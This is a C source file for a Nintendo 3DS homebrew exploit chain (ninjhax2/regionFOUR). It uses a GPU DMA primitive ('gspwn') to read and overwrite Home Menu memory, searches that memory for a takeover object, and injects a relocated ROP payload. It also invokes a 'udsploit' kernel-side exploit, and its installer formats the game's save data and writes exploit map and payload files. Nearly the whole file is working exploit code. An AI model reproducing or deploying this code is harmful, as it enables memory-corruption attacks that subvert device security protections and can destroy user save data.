#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <ctr/types.h>
#include <ctr/srv.h>
#include <ctr/svc.h>
#include <ctr/APT.h>
#include <ctr/FS.h>
#include <ctr/GSP.h>
#include "text.h"
#ifndef LOADROPBIN
#include "menu_payload_regionfree_bin.h"
#else
#include "menu_payload_loadropbin_bin.h"
#endif

#ifndef OTHERAPP
#ifndef QRINSTALLER
#include "cn_save_initial_loader_bin.h"
#endif
#endif

#ifdef LOADROPBIN
#include "menu_ropbin_bin.h"
#endif

#include "../../build/constants.h"
#include "../../app_targets/app_targets.h"

#include "decompress.h"

#define HID_PAD (*(vu32*)0x1000001C)

typedef enum
{
	PAD_A = (1<<0),
	PAD_B = (1<<1),
	PAD_SELECT = (1<<2),
	PAD_START = (1<<3),
	PAD_RIGHT = (1<<4),
	PAD_LEFT = (1<<5),
	PAD_UP = (1<<6),
	PAD_DOWN = (1<<7),
	PAD_R = (1<<8),
	PAD_L = (1<<9),
	PAD_X = (1<<10),
	PAD_Y = (1<<11)
}PAD_KEY;

int _strlen(char* str)
{
	int l=0;
	while(*(str++))l++;
	return l;
}

void _strcpy(char* dst, char* src)
{
	while(*src)*(dst++)=*(src++);
	*dst=0x00;
}

void _strappend(char* str1, char* str2)
{
	_strcpy(&str1[_strlen(str1)], str2);
}

Result _srv_RegisterClient(Handle* handleptr)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x10002; //request header code
	cmdbuf[1]=0x20;

	Result ret=0;
	if((ret=svc_sendSyncRequest(*handleptr)))return ret;

	return cmdbuf[1];
}

Result _initSrv(Handle* srvHandle)
{
	Result ret=0;
	if(svc_connectToPort(srvHandle, "srv:"))return ret;
	return _srv_RegisterClient(srvHandle);
}

Result _srv_getServiceHandle(Handle* handleptr, Handle* out, char* server)
{
	u8 l=_strlen(server);
	if(!out || !server || l>8)return -1;

	u32* cmdbuf=getThreadCommandBuffer();

	cmdbuf[0]=0x50100; //request header code
	_strcpy((char*)&cmdbuf[1], server);
	cmdbuf[3]=l;
	cmdbuf[4]=0x0;

	Result ret=0;
	if((ret=svc_sendSyncRequest(*handleptr)))return ret;

	*out=cmdbuf[3];

	return cmdbuf[1];
}

Result _GSPGPU_ImportDisplayCaptureInfo(Handle* handle, GSP_CaptureInfo *captureinfo)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x00180000; //request header code

	Result ret=0;
	if((ret=svc_sendSyncRequest(*handle)))return ret;

	ret = cmdbuf[1];

	if(ret==0)
	{
		memcpy(captureinfo, &cmdbuf[2], 0x20);
	}

	return ret;
}

u8 *GSP_GetTopFBADR()
{
	GSP_CaptureInfo capinfo;
	u32 ptr;

	#ifndef OTHERAPP
		Handle* gspHandle=(Handle*)CN_GSPHANDLE_ADR;
	#else
		u32 *paramblk = (u32*)*((u32*)0xFFFFFFC);
		Handle* gspHandle=(Handle*)paramblk[0x58>>2];
	#endif

	if(_GSPGPU_ImportDisplayCaptureInfo(gspHandle, &capinfo)!=0)return NULL;

	ptr = (u32)capinfo.screencapture[0].framebuf0_vaddr;
	if(ptr>=0x1f000000 && ptr<0x1f600000)return NULL;//Don't return a ptr to VRAM if framebuf is located there, since writing there will only crash.

	return (u8*)ptr;
}

Result GSP_FlushDCache(u32* addr, u32 size)
{
	#ifndef OTHERAPP
		Result (*_GSPGPU_FlushDataCache)(Handle* handle, Handle kprocess, u32* addr, u32 size)=(void*)CN_GSPGPU_FlushDataCache_ADR;
		Handle* gspHandle=(Handle*)CN_GSPHANDLE_ADR;
		return _GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, addr, size);
	#else
		Result (*_GSP_FlushDCache)(u32* addr, u32 size);
		u32 *paramblk = (u32*)*((u32*)0xFFFFFFC);
		_GSP_FlushDCache=(void*)paramblk[0x20>>2];
		return _GSP_FlushDCache(addr, size);
	#endif
}

Result GSP_InvalidateDCache(u32* addr, u32 size)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0] = 0x00090082; //request header code
	cmdbuf[1] = (u32)addr;
	cmdbuf[2] = size;
	cmdbuf[3] = 0;
	cmdbuf[4] = 0xFFFF8001;

	#ifndef OTHERAPP
		Handle* gspHandle=(Handle*)CN_GSPHANDLE_ADR;
	#else
		u32 *paramblk = (u32*)*((u32*)0xFFFFFFC);
		Handle* gspHandle=(Handle*)paramblk[0x58>>2];
	#endif

	Result ret;
	if((ret = svc_sendSyncRequest(gspHandle))) return ret;

	return cmdbuf[1];
}

const u8 hexTable[]=
{
	'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'
};

void hex2str(char* out, u32 val)
{
	int i;
	for(i=0;i<8;i++){out[7-i]=hexTable[val&0xf];val>>=4;}
	out[8]=0x00;
}

void renderString(char* str, int x, int y)
{
	u8 *ptr = GSP_GetTopFBADR();
	if(ptr==NULL)return;
	drawString(ptr,str,x,y);
	GSP_FlushDCache((u32*)ptr, 240*400*3);
}

void centerString(char* str, int y)
{
	renderString(str, 200-(_strlen(str)*4), y);
}

void drawHex(u32 val, int x, int y)
{
	char str[9];

	hex2str(str,val);
	renderString(str,x,y);
}

Result _GSPGPU_ReleaseRight(Handle handle)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x170000; //request header code

	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

const char* const aptServiceNames[] = {"APT:U", "APT:A", "APT:S"};

#define _aptSessionInit() \
	int aptIndex; \
	for(aptIndex = 0; aptIndex < 3; aptIndex++)	if(!_srv_getServiceHandle(srvHandle, &aptuHandle, (char*)aptServiceNames[aptIndex]))break;\
	svc_closeHandle(aptuHandle);\

#define _aptOpenSession() \
	svc_waitSynchronization1(aptLockHandle, U64_MAX);\
	_srv_getServiceHandle(srvHandle, &aptuHandle, (char*)aptServiceNames[aptIndex]);\

#define _aptCloseSession()\
	svc_closeHandle(aptuHandle);\
	svc_releaseMutex(aptLockHandle);\

void doGspwn(u32* src, u32* dst, u32 size)
{
	#ifndef OTHERAPP
		Result (*nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue)(u32** sharedGspCmdBuf, u32* cmdAdr)=(void*)CN_nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue;
		u32 gxCommand[]=
		{
			0x00000004, //command header (SetTextureCopy)
			(u32)src, //source address
			(u32)dst, //destination address
			size, //size
			0xFFFFFFFF, // dim in
			0xFFFFFFFF, // dim out
			0x00000008, // flags
			0x00000000, //unused
		};

		u32** sharedGspCmdBuf=(u32**)(CN_GSPSHAREDBUF_ADR);
		nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue(sharedGspCmdBuf, gxCommand);
	#else
		Result (*gxcmd4)(u32 *src, u32 *dst, u32 size, u16 width0, u16 height0, u16 width1, u16 height1, u32 flags);
		u32 *paramblk = (u32*)*((u32*)0xFFFFFFC);
		gxcmd4=(void*)paramblk[0x1c>>2];
		gxcmd4(src, dst, size, 0, 0, 0, 0, 0x8);
	#endif
}

void clearScreen(u8 shade)
{
	u8 *ptr = GSP_GetTopFBADR();
	if(ptr==NULL)return;
	memset(ptr, shade, 240*400*3);
	GSP_FlushDCache((u32*)ptr, 240*400*3);
}

void errorScreen(char* str, u32* dv, u8 n)
{
	clearScreen(0x00);
	renderString("FATAL ERROR",0,0);
	renderString(str,0,10);
	if(dv && n)
	{
		int i;
		for(i=0;i<n;i++)drawHex(dv[i], 8, 50+i*10);
	}
	while(1);
}

void drawTitleScreen(char* str)
{
	clearScreen(0x00);
	centerString(HAX_NAME_VERSION,0);
	centerString(BUILDTIME,10);
	centerString("smealum.github.io/ninjhax2/",20);
	renderString(str, 0, 40);
}

// Result _APT_HardwareResetAsync(Handle* handle)
// {
// 	u32* cmdbuf=getThreadCommandBuffer();
// 	cmdbuf[0]=0x4E0000; //request header code
	
// 	Result ret=0;
// 	if((ret=svc_sendSyncRequest(*handle)))return ret;
	
// 	return cmdbuf[1];
// }

#ifndef OTHERAPP
#ifndef QRINSTALLER
//no idea what this does; apparently used to switch up save partitions
Result FSUSER_ControlArchive(Handle handle, FS_archive archive)
{
	u32* cmdbuf=getThreadCommandBuffer();

	u32 b1 = 0, b2 = 0;

	cmdbuf[0]=0x080d0144;
	cmdbuf[1]=archive.handleLow;
	cmdbuf[2]=archive.handleHigh;
	cmdbuf[3]=0x0;
	cmdbuf[4]=0x1; //buffer1 size
	cmdbuf[5]=0x1; //buffer1 size
	cmdbuf[6]=0x1a;
	cmdbuf[7]=(u32)&b1;
	cmdbuf[8]=0x1c;
	cmdbuf[9]=(u32)&b2;
 
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;
 
	return cmdbuf[1];
}

Result FSUSER_FormatThisUserSaveData(Handle handle, u32 sizeblock, u32 countDirectoryEntry, u32 countFileEntry, u32 countDirectoryEntryBucket, u32 countFileEntryBucket, bool isDuplicateAll)
{
	u32* cmdbuf=getThreadCommandBuffer();

	cmdbuf[0]=0x080F0180;
	cmdbuf[1]=sizeblock;
	cmdbuf[2]=countDirectoryEntry;
	cmdbuf[3]=countFileEntry;
	cmdbuf[4]=countDirectoryEntryBucket;
	cmdbuf[5]=countFileEntryBucket;
	cmdbuf[6]=isDuplicateAll;
 
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;
 
	return cmdbuf[1];
}

Result FSUSER_CreateDirectory(Handle handle, FS_archive archive, FS_path dirLowPath)
{
	u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = 0x08090182;
	cmdbuf[1] = 0;
	cmdbuf[2] = archive.handleLow;
	cmdbuf[3] = archive.handleHigh;
	cmdbuf[4] = dirLowPath.type;
	cmdbuf[5] = dirLowPath.size;
	cmdbuf[6] = 0;
	cmdbuf[7] = (dirLowPath.size << 14) | 0x2;
	cmdbuf[8] = (u32)dirLowPath.data;

	Result ret = 0;
	if((ret = svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

void installerScreen(u32 size)
{
	char str[512] =
		"install the exploit to your savegame ?\n"
		"this will delete your savegame and make some\n"
		"of the game temporarily inoperable.\n"
		"the exploit can later be uninstalled.\n"
		"    A : Yes \n"
		"    B : No  ";
	drawTitleScreen(str);

	while(1)
	{
		u32 PAD = HID_PAD;
		if(PAD & PAD_A)
		{
			// install
			int state=0;
			Result ret;
			Handle fsuHandle=*(Handle*)CN_FSHANDLE_ADR;
			FS_archive saveArchive=(FS_archive){0x00000004, (FS_path){PATH_EMPTY, 1, (u8*)""}};
			u32 totalWritten1 = 0x0deaddad;
			u32 totalWritten2 = 0x1deaddad;
			Handle fileHandle;

			_strappend(str, "\n\n   installing..."); drawTitleScreen(str);

			// format the shit out of the archive
			ret=FSUSER_FormatThisUserSaveData(fsuHandle, 0x200, 0x20, 0x40, 0x25, 0x43, true);
			state++; if(ret)goto installEnd;

			ret=FSUSER_OpenArchive(fsuHandle, &saveArchive);
			state++; if(ret)goto installEnd;

			ret=FSUSER_CreateDirectory(fsuHandle, saveArchive, FS_makePath(PATH_CHAR, "/edit/"));
			state++; if(ret)goto installEnd;

			// write exploit map file
			ret=FSUSER_OpenFile(fsuHandle, &fileHandle, saveArchive, FS_makePath(PATH_CHAR, "/edit/mslot0.map"), FS_OPEN_WRITE|FS_OPEN_CREATE, FS_ATTRIBUTE_NONE);
			state++; if(ret)goto installEnd;
			ret=FSFILE_Write(fileHandle, &totalWritten1, 0x0, (u32*)cn_save_initial_loader_bin, cn_save_initial_loader_bin_size, 0x10001);
			state++; if(ret)goto installEnd;
			ret=FSFILE_Close(fileHandle);
			state++; if(ret)goto installEnd;

			// write secondary payload file
			ret=FSUSER_OpenFile(fsuHandle, &fileHandle, saveArchive, FS_makePath(PATH_CHAR, "/edit/payload.bin"), FS_OPEN_WRITE|FS_OPEN_CREATE, FS_ATTRIBUTE_NONE);
			state++; if(ret)goto installEnd;
			ret=FSFILE_Write(fileHandle, &totalWritten2, 0x0, (u32*)0x14300000, size, 0x10001);
			state++; if(ret)goto installEnd;
			ret=FSFILE_Close(fileHandle);
			state++; if(ret)goto installEnd;

			ret=FSUSER_ControlArchive(fsuHandle, saveArchive);
			state++; if(ret)goto installEnd;

			ret=FSUSER_CloseArchive(fsuHandle, &saveArchive);
			state++; if(ret)goto installEnd;

			installEnd:
			if(ret)
			{
				u32 v[5]={ret, state, totalWritten1, totalWritten2, size};
				errorScreen("   installation process failed.\n   please report the below information by\n   email to sme@lum.sexy", v, 5);
			}

			_strappend(str, " done.\n\n   press A to run the exploit."); drawTitleScreen(str);
			u32 oldPAD=((u32*)0x10000000)[7];
			while(1)
			{
				u32 PAD=((u32*)0x10000000)[7];
				if(((PAD^oldPAD)&PAD_A) && (PAD&PAD_A))break;
				drawHex(PAD,200,200);
				oldPAD=PAD;
			}

			break;
		}else if(PAD&PAD_B)break;
	}
}
#endif
#endif

#ifdef RECOVERY
void doRecovery()
{
	char str[512] =
		"Recovery mode\n\n"
		"please select your current firmware version\n";
	drawTitleScreen(str);

	u8 firmwareVersion[6] = {IS_N3DS, 9, 0, 0, 20, }; //[old/new][NUP0][NUP1][NUP2]-[NUP][region]

}
#endif

Result _APT_AppletUtility(Handle* handle, u32* out, u32 a, u32 size1, u8* buf1, u32 size2, u8* buf2)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x4B00C2; //request header code
	cmdbuf[1]=a;
	cmdbuf[2]=size1;
	cmdbuf[3]=size2;
	cmdbuf[4]=(size1<<14)|0x402;
	cmdbuf[5]=(u32)buf1;
	
	cmdbuf[0+0x100/4]=(size2<<14)|2;
	cmdbuf[1+0x100/4]=(u32)buf2;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(*handle)))return ret;

	if(out)*out=cmdbuf[2];

	return cmdbuf[1];
}

Result _APT_NotifyToWait(Handle* handle, u32 a)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x430040; //request header code
	cmdbuf[1]=a;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

Result _APT_CancelLibraryApplet(Handle* handle, u32 is_end)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x3b0040; //request header code
	cmdbuf[1]=is_end;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

Result _APT_IsRegistered(Handle* handle, u32 app_id, u8* out)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x90040; //request header code
	cmdbuf[1]=app_id;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(*handle)))return ret;

	if(out)*out = cmdbuf[2];

	return cmdbuf[1];
}

Result _APT_ReceiveParameter(Handle* handle, u32 app_id)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0xd0080; //request header code
	cmdbuf[1]=app_id;
	cmdbuf[2]=0x0;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

Result _APT_Finalize(Handle* handle, u32 a)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x40040; //request header code
	cmdbuf[1]=a;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

Result _APT_PrepareToCloseApplication(Handle* handle, u8 a)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x220040; //request header code
	cmdbuf[1]=a;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

Result _APT_CloseApplication(Handle* handle, u32 a, u32 b, u32 c)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x270044; //request header code
	cmdbuf[1]=a;
	cmdbuf[2]=0x0;
	cmdbuf[3]=b;
	cmdbuf[4]=(a<<14)|2;
	cmdbuf[5]=c;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

Result _APT_GetLockHandle(Handle* handle, u16 flags, Handle* lockHandle)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x10040; //request header code
	cmdbuf[1]=flags;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(*handle)))return ret;
	
	if(lockHandle)*lockHandle=cmdbuf[5];
	
	return cmdbuf[1];
}

void _aptExit()
{
	Handle _srvHandle;
	Handle* srvHandle = &_srvHandle;
	Handle aptLockHandle = 0;
	Handle aptuHandle=0x00;

	_initSrv(srvHandle);

	_aptSessionInit();

	#ifndef OTHERAPP
		aptLockHandle=*((Handle*)CN_APTLOCKHANDLE_ADR);
	#else
		_aptOpenSession();
		_APT_GetLockHandle(&aptuHandle, 0x0, &aptLockHandle);
		_aptCloseSession();
	#endif

	_aptOpenSession();
	_APT_CancelLibraryApplet(&aptuHandle, 0x1);
	_aptCloseSession();

	_aptOpenSession();
	_APT_NotifyToWait(&aptuHandle, 0x300);
	_aptCloseSession();

	u32 buf1;
	u8 buf2[4];

	_aptOpenSession();
	buf1 = 0x00;
	_APT_AppletUtility(&aptuHandle, NULL, 0x4, 0x1, (u8*)&buf1, 0x1, buf2);
	_aptCloseSession();

	u8 out = 1;
	while(out)
	{
		_aptOpenSession();
		_APT_IsRegistered(&aptuHandle, 0x401, &out); // wait until swkbd is dead
		_aptCloseSession();
	}

	_aptOpenSession();
	buf1 = 0x10;
	_APT_AppletUtility(&aptuHandle, NULL, 0x7, 0x4, (u8*)&buf1, 0x1, buf2);
	_aptCloseSession();

	_aptOpenSession();
	buf1 = 0x00;
	_APT_AppletUtility(&aptuHandle, NULL, 0x4, 0x1, (u8*)&buf1, 0x1, buf2);
	_aptCloseSession();


	_aptOpenSession();
	_APT_PrepareToCloseApplication(&aptuHandle, 0x1);
	_aptCloseSession();

	_aptOpenSession();
	_APT_CloseApplication(&aptuHandle, 0x0, 0x0, 0x0);
	_aptCloseSession();

	svc_closeHandle(aptLockHandle);
}

void inject_payload(u32* linear_buffer, u32 target_address, u32* ropbin_linear_buffer, u32 ropbin_size)
{
	u32 target_base = target_address & ~0xFF;
	u32 target_offset = target_address - target_base;

	//read menu memory
	{
		GSP_FlushDCache(linear_buffer, 0x00002000);
		
		doGspwn((u32*)(target_base), linear_buffer, 0x00002000);
	}

	svc_sleepThread(10000000); //sleep long enough for memory to be read

	//patch memdump and write it
	{
		u32* payload_src;
		u32 payload_size;

		#ifndef LOADROPBIN
			payload_src = (u32*)menu_payload_regionfree_bin;
			payload_size = menu_payload_regionfree_bin_size;
		#else
			payload_src = (u32*)menu_payload_loadropbin_bin;
			payload_size = menu_payload_loadropbin_bin_size;
		#endif

		u32* payload_dst = &(linear_buffer)[target_offset/4];

		//patch in payload
		int i;
		for(i=0; i<payload_size/4; i++)
		{
			const u32 val = payload_src[i];;
			if(val < 0xBABE0000+0x200 && val > 0xBABE0000-0x200)
			{
				payload_dst[i] = val + target_address - 0xBABE0000;
			}else if((val & 0xFFFFFF00) == 0xFADE0000){
				switch(val & 0xFF)
				{
					case 1:
						// source ropbin + bkp linear address
						payload_dst[i] = (u32)ropbin_linear_buffer;
						break;
					case 2:
						// ropbin + bkp size
						payload_dst[i] = ropbin_size;
						break;
				}
			}else if(val != 0xDEADCAFE){
				payload_dst[i] = val;
			}
		}

		GSP_FlushDCache(linear_buffer, 0x00002000);

		doGspwn(linear_buffer, (u32*)(target_base), 0x00002000);
	}

	svc_sleepThread(10000000); //sleep long enough for memory to be written
}

Result _GSPGPU_SetBufferSwap(Handle handle, u32 screenid, GSP_FramebufferInfo framebufinfo)
{
	Result ret=0;
	u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = 0x00050200;
	cmdbuf[1] = screenid;
	memcpy(&cmdbuf[2], &framebufinfo, sizeof(GSP_FramebufferInfo));
	
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

Result udsploit(u32*);

int main(u32 loaderparam, char** argv)
{
	#ifdef OTHERAPP
		u32 *paramblk = (u32*)loaderparam;
	#endif

	#ifndef OTHERAPP
		Handle* gspHandle=(Handle*)CN_GSPHANDLE_ADR;
		u32* linear_buffer = (u32*)0x14100000;
	#else
		Handle* gspHandle=(Handle*)paramblk[0x58>>2];
		u32* linear_buffer = (u32*)((((u32)paramblk) + 0x1000) & ~0xfff);
	#endif

	// put framebuffers in linear mem so they're writable
	u8* top_framebuffer = &linear_buffer[0x00100000/4];
	u8* low_framebuffer = &top_framebuffer[0x00046500];
	_GSPGPU_SetBufferSwap(*gspHandle, 0, (GSP_FramebufferInfo){0, (u32*)top_framebuffer, (u32*)top_framebuffer, 240 * 3, (1<<8)|(1<<6)|1, 0, 0});
	_GSPGPU_SetBufferSwap(*gspHandle, 1, (GSP_FramebufferInfo){0, (u32*)low_framebuffer, (u32*)low_framebuffer, 240 * 3, 1, 0, 0});

	int line=10;
	drawTitleScreen("");

	#ifdef RECOVERY
		u32 PAD = HID_PAD;
		if((PAD & KEY_L) && (PAD & KEY_R)) doRecovery();
	#endif

	#ifndef OTHERAPP
	#ifndef QRINSTALLER
		if(loaderparam)installerScreen(loaderparam);
	#endif
	#endif

	#ifdef UDSPLOIT
	{
		Result ret = 0;

		s64 tmp = 0;
		ret = svc_getSystemInfo(&tmp, 0, 1);
		drawHex(*(u32*)0x1FF80040 - (u32)tmp, 8, 40);

		MemInfo minfo;
		PageInfo pinfo;
		ret = svc_queryMemory(&minfo, &pinfo, 0x08000000);
		drawHex(minfo.size, 8, 50);

		#define UDS_ERROR_INDICATOR 0x00011000

		ret = udsploit(linear_buffer);
		ret ^= UDS_ERROR_INDICATOR;
		drawHex(ret, 8, 60);

		if(ret ^ UDS_ERROR_INDICATOR)
		{
			renderString("something failed :(", 8, 80);
			if(ret == (0xc9411002 ^ UDS_ERROR_INDICATOR)) renderString("please try again with wifi enabled", 8, 90);
			else renderString("please report error code above", 8, 90);
			while(1);
		}
	}
	#endif

	// regionfour stuff
	drawTitleScreen("searching for target...");

	//search for target object in home menu's linear heap
	const u32 start_addr = FIRM_LINEARSYSTEM;
	const u32 end_addr = FIRM_LINEARSYSTEM + 0x01000000;
	const u32 block_size = 0x00010000;
	const u32 block_stride = block_size-0x100; // keep some overlap to make sure we don't miss anything

	int targetProcessIndex = 1;

	#ifdef LOADROPBIN
		// u32 binsize = (menu_ropbin_bin_size + 0xff) & ~0xff; // Align to 0x100-bytes.
		u32 binsize = 0x8000; // fuck modularity
		u32 *ptr32 = (u32*)menu_ropbin_bin;
		u32* ropbin_linear_buffer = &((u8*)linear_buffer)[block_size];
		u32* ropbin_bkp_linear_buffer = &((u8*)ropbin_linear_buffer)[MENU_LOADEDROP_BKP_BUFADR - MENU_LOADEDROP_BUFADR];

		// Decompress menu_ropbin_bin into homemenu linearmem.
		lz11Decompress(&menu_ropbin_bin[4], (u8*)ropbin_linear_buffer, ptr32[0] >> 8);

		// copy un-processed ropbin to backup location
		memcpy(ropbin_bkp_linear_buffer, ropbin_linear_buffer, MENU_LOADEDROP_BKP_BUFADR - MENU_LOADEDROP_BUFADR);
		patchPayload(ropbin_linear_buffer, targetProcessIndex, NULL);
		GSP_FlushDCache(ropbin_linear_buffer, (MENU_LOADEDROP_BKP_BUFADR - MENU_LOADEDROP_BUFADR) * 2);

		// // copy parameter block
		// memset(ropbin_linear_buffer, 0x00, MENU_PARAMETER_SIZE);
		// GSP_FlushDCache(ropbin_linear_buffer, MENU_PARAMETER_SIZE);
		// doGspwn(ropbin_linear_buffer, (u32*)(MENU_PARAMETER_BUFADR), MENU_PARAMETER_SIZE);
		// svc_sleepThread(20*1000*1000);
	#endif

	int cnt = 0;
	u32 block_start;
	u32 target_address = start_addr;
	for(block_start=start_addr; block_start<end_addr; block_start+=block_stride)
	{
		//read menu memory
		{
			GSP_FlushDCache(linear_buffer, block_size);
			
			doGspwn((u32*)(block_start), linear_buffer, block_size);
		}

		svc_sleepThread(1000000); //sleep long enough for memory to be read

		int i;
		u32 end = block_size/4-0x10;
		for(i = 0; i < end; i++)
		{
			const u32* adr = &(linear_buffer)[i];
			if(adr[2] == 0x5544 && adr[3] == 0x80 && adr[6]!=0x0 && adr[0x1F] == 0x6E4C5F4E)break;
		}

		if(i < end)
		{
			drawTitleScreen("searching for target...\n    target locked ! engaging.");

			target_address = block_start + i * 4;

			// drawHex(target_address, 8, 50+cnt*10);
			// drawHex((linear_buffer)[i+6], 100, 50+cnt*10);
			// drawHex((linear_buffer)[i+0x1f], 200, 50+cnt*10);

			#ifdef LOADROPBIN
				inject_payload(linear_buffer, target_address + 0x18, ropbin_linear_buffer, (MENU_LOADEDROP_BKP_BUFADR - MENU_LOADEDROP_BUFADR) * 2);
			#else
				inject_payload(linear_buffer, target_address + 0x18, NULL, 0);
			#endif

			block_start = target_address + 0x10 - block_stride;
			cnt++;
			break;
		}
	}

	svc_sleepThread(100000000); //sleep long enough for memory to be written

	if(cnt)
	{
		#ifndef LOADROPBIN
			drawTitleScreen("\n   regionFOUR is ready.\n   insert your gamecard and press START.");
		#else
			drawTitleScreen("\n   The homemenu ropbin is ready.");
		#endif
	}else{
		drawTitleScreen("\n   failed to locate takeover object :(");
		while(1);
	}
	
	//disable GSP module access
	_GSPGPU_ReleaseRight(*gspHandle);
	svc_closeHandle(*gspHandle);

	//exit to menu
	_aptExit();

	svc_exitProcess();

	while(1);
	return 0;
}
